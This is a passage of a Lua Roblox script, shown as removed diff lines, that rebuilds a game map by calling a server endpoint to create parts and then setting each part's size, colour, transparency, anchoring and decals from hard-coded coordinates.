-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.92193603515625,49.32439422607422,-24.27752685546875),workspace)
-			resize(pt,Vector3.new(9.199799537658691,11.149971961975098,0.9998931884765625),CFrame.new(-126.92193603515625,49.32439422607422,-24.27752685546875)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.96231079101562,58.099449157714844,-42.877716064453125),workspace)
-			resize(pt,Vector3.new(27.99998664855957,7.299996376037598,0.8999975323677063),CFrame.new(-126.96231079101562,58.099449157714844,-42.877716064453125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.80227661132812,50.7493896484375,0.19720458984375),workspace)
-			resize(pt,Vector3.new(39.44981002807617,0.30000001192092896,0.25),CFrame.new(-126.80227661132812,50.7493896484375,0.19720458984375)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.802978515625,49.32439422607422,0.07232666015625),workspace)
-			resize(pt,Vector3.new(4.399798393249512,11.149971961975098,0.9998931884765625),CFrame.new(-126.802978515625,49.32439422607422,0.07232666015625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.96456909179688,47.44940185546875,-33.0272216796875),workspace)
-			resize(pt,Vector3.new(8.299806594848633,13.999968528747559,0.05000000074505806),CFrame.new(-126.96456909179688,47.44940185546875,-33.0272216796875)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0.5)
-			color(pt,Color3.fromRGB(71,99,89))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.81387329101562,57.77439880371094,-2.17755126953125),workspace)
-			resize(pt,Vector3.new(53.3997802734375,5.849966526031494,0.9998931884765625),CFrame.new(-126.81387329101562,57.77439880371094,-2.17755126953125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-130.95916748046875,42.40167999267578,-7.4588623046875),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-130.95916748046875,42.40167999267578,-7.4588623046875)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-130.9583740234375,42.40167999267578,14.091201782226562),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-130.9583740234375,42.40167999267578,14.091201782226562)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.81405639648438,42.12440490722656,-2.1776123046875),workspace)
-			resize(pt,Vector3.new(53.39982604980469,3.249966621398926,0.9998931884765625),CFrame.new(-126.81405639648438,42.12440490722656,-2.1776123046875)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.85641479492188,49.299400329589844,-10.87762451171875),workspace)
-			resize(pt,Vector3.new(17.599803924560547,11.099964141845703,0.05000000074505806),CFrame.new(-126.85641479492188,49.299400329589844,-10.87762451171875)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0.5)
-			color(pt,Color3.fromRGB(71,99,89))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Front)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Front)
-			transparency(pt,0.699999988079071)
-			createdecal(pt,Enum.NormalId.Back)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Back)
-			transparency(pt,0.699999988079071)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.85671997070312,49.29937744140625,-10.952606201171875),workspace)
-			resize(pt,Vector3.new(0.30000001192092896,11.199997901916504,0.25),CFrame.new(-126.85671997070312,49.29937744140625,-10.952606201171875)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.74893188476562,49.299400329589844,11.12213134765625),workspace)
-			resize(pt,Vector3.new(17.599803924560547,11.099964141845703,0.05000000074505806),CFrame.new(-126.74893188476562,49.299400329589844,11.12213134765625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0.5)
-			color(pt,Color3.fromRGB(71,99,89))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Front)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Front)
-			transparency(pt,0.699999988079071)
-			createdecal(pt,Enum.NormalId.Back)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Back)
-			transparency(pt,0.699999988079071)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.74929809570312,49.29937744140625,11.04718017578125),workspace)
-			resize(pt,Vector3.new(0.30000001192092896,11.199997901916504,0.25),CFrame.new(-126.74929809570312,49.29937744140625,11.04718017578125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.78619384765625,44.049400329589844,-42.578399658203125),workspace)
-			resize(pt,Vector3.new(0.09980656951665878,3.599970817565918,0.10000000894069672),CFrame.new(-126.78619384765625,44.049400329589844,-42.578399658203125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.98605346679688,47.44940185546875,-37.427154541015625),workspace)
-			resize(pt,Vector3.new(0.4998062551021576,13.999968528747559,0.44999998807907104),CFrame.new(-126.98605346679688,47.44940185546875,-37.427154541015625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.99972534179688,45.44940185546875,-40.2271728515625),workspace)
-			resize(pt,Vector3.new(5.099806785583496,9.999967575073242,0.05000000074505806),CFrame.new(-126.99972534179688,45.44940185546875,-40.2271728515625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0.5)
-			color(pt,Color3.fromRGB(71,99,89))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-127.01046752929688,50.599403381347656,-42.4271240234375),workspace)
-			resize(pt,Vector3.new(28.499805450439453,0.29996782541275024,0.44999998807907104),CFrame.new(-127.01046752929688,50.599403381347656,-42.4271240234375)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-127.01254272460938,52.599403381347656,-42.85205078125),workspace)
-			resize(pt,Vector3.new(10.349809646606445,3.699967384338379,0.05000000074505806),CFrame.new(-127.01254272460938,52.599403381347656,-42.85205078125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0.5)
-			color(pt,Color3.fromRGB(71,99,89))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-127.03878784179688,47.44940185546875,-48.227142333984375),workspace)
-			resize(pt,Vector3.new(0.4998062551021576,13.999968528747559,0.44999998807907104),CFrame.new(-127.03878784179688,47.44940185546875,-48.227142333984375)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-127.06002807617188,47.44940185546875,-52.57708740234375),workspace)
-			resize(pt,Vector3.new(8.199806213378906,13.999968528747559,0.05000000074505806),CFrame.new(-127.06002807617188,47.44940185546875,-52.57708740234375)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0.5)
-			color(pt,Color3.fromRGB(71,99,89))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-127.06118774414062,44.89939880371094,-42.577056884765625),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,0.15000000596046448,0.4500000476837158),CFrame.new(-127.06118774414062,44.89939880371094,-42.577056884765625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-127.06118774414062,43.19940185546875,-42.577056884765625),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,0.15000000596046448,0.4500000476837158),CFrame.new(-127.06118774414062,43.19940185546875,-42.577056884765625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-128.66107177734375,42.04945373535156,-66.61993408203125),workspace)
-			resize(pt,Vector3.new(0.09999983012676239,3.100001096725464,15.100003242492676),CFrame.new(-128.66107177734375,42.04945373535156,-66.61993408203125)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(204,142,105))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Left)
-			transparency(pt,0.8999999761581421)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-128.65206909179688,41.79945373535156,-64.76986694335938),workspace)
-			resize(pt,Vector3.new(3.599998950958252,2.600001335144043,14.900002479553223),CFrame.new(-128.65206909179688,41.79945373535156,-64.76986694335938)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(53,43,36))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-128.64300537109375,42.04945373535156,-62.9200439453125),workspace)
-			resize(pt,Vector3.new(0.10000000149011612,3.100001096725464,15.100003242492676),CFrame.new(-128.64300537109375,42.04945373535156,-62.9200439453125)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(204,142,105))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Right)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Right)
-			transparency(pt,0.8999999761581421)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-127.336181640625,44.049400329589844,-42.575714111328125),workspace)
-			resize(pt,Vector3.new(0.09980656951665878,3.599970817565918,0.10000000894069672),CFrame.new(-127.336181640625,44.049400329589844,-42.575714111328125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.69525146484375,49.32439422607422,22.121963500976562),workspace)
-			resize(pt,Vector3.new(4.399798393249512,11.149971961975098,0.9998931884765625),CFrame.new(-126.69525146484375,49.32439422607422,22.121963500976562)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-126.663330078125,41.974403381347656,-2.02838134765625),workspace)
-			resize(pt,Vector3.new(53.299827575683594,2.9499669075012207,0.8998931646347046),CFrame.new(-126.663330078125,41.974403381347656,-2.02838134765625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-134.33731079101562,68.69432067871094,-42.78712463378906),workspace)
-			resize(pt,Vector3.new(12.399999618530273,0.05000000074505806,20.399999618530273),CFrame.new(-134.33731079101562,68.69432067871094,-42.78712463378906)*CFrame.Angles(math.rad(0),math.rad(0.2800000011920929),math.rad(-90)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setcollision(pt,false)
-			setname(pt,"Neon Sign")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-124.45346069335938,45.44940185546875,-48.587921142578125),workspace)
-			resize(pt,Vector3.new(5.099806785583496,9.999968528747559,0.05000000074505806),CFrame.new(-124.45346069335938,45.44940185546875,-48.587921142578125)*CFrame.Angles(math.rad(0),math.rad(-164.7209930419922),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0.5)
-			color(pt,Color3.fromRGB(71,99,89))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-122.24569702148438,44.049400329589844,-49.424224853515625),workspace)
-			resize(pt,Vector3.new(0.09980656951665878,3.599970817565918,0.10000000894069672),CFrame.new(-122.24569702148438,44.049400329589844,-49.424224853515625)*CFrame.Angles(math.rad(0),math.rad(-164.7209930419922),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-122.53421020507812,42.30168151855469,11.967803955078125),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-122.53421020507812,42.30168151855469,11.967803955078125)*CFrame.Angles(math.rad(0),math.rad(-179.71800231933594),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-122.53536987304688,42.30168151855469,-17.9322509765625),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-122.53536987304688,42.30168151855469,-17.9322509765625)*CFrame.Angles(math.rad(0),math.rad(-179.71800231933594),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-122.546630859375,56.64942932128906,0.01123046875),workspace)
-			resize(pt,Vector3.new(7.200002670288086,1.800004243850708,48.79999542236328),CFrame.new(-122.546630859375,56.64942932128906,0.01123046875)*CFrame.Angles(math.rad(0),math.rad(-179.81199645996094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Union")
-			createdecal(pt,Enum.NormalId.Front)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Front)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Left)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Left)
-			transparency(pt,0.800000011920929)
-			createdecal(pt,Enum.NormalId.Back)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Back)
-			transparency(pt,0.800000011920929)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-122.63037109375,51.59938049316406,-26.09869384765625),workspace)
-			resize(pt,Vector3.new(5.599987030029297,22.199996948242188,8),CFrame.new(-122.63037109375,51.59938049316406,-26.09869384765625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-122.463623046875,42.30168151855469,-12.110626220703125),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-122.463623046875,42.30168151855469,-12.110626220703125)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-121.15234375,42.04823303222656,-64.80685424804688),workspace)
-			resize(pt,Vector3.new(3.7999985218048096,3.100001096725464,0.10000000149011612),CFrame.new(-121.15234375,42.04823303222656,-64.80685424804688)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(204,142,105))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Front)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Front)
-			transparency(pt,0.8999999761581421)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-122.17340087890625,43.19939422607422,-49.15899658203125),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,0.15000000596046448,0.4500000476837158),CFrame.new(-122.17340087890625,43.19939422607422,-49.15899658203125)*CFrame.Angles(math.rad(0),math.rad(-164.7209930419922),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-122.17340087890625,44.89939880371094,-49.15899658203125),workspace)
-			resize(pt,Vector3.new(0.05000000074505806,0.15000000596046448,0.4500000476837158),CFrame.new(-122.17340087890625,44.89939880371094,-49.15899658203125)*CFrame.Angles(math.rad(0),math.rad(-164.7209930419922),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-122.10089111328125,44.049400329589844,-48.89373779296875),workspace)
-			resize(pt,Vector3.new(0.09980656951665878,3.599970817565918,0.10000000894069672),CFrame.new(-122.10089111328125,44.049400329589844,-48.89373779296875)*CFrame.Angles(math.rad(0),math.rad(-164.7209930419922),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(159,161,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-122.46246337890625,42.30168151855469,17.789382934570312),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-122.46246337890625,42.30168151855469,17.789382934570312)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
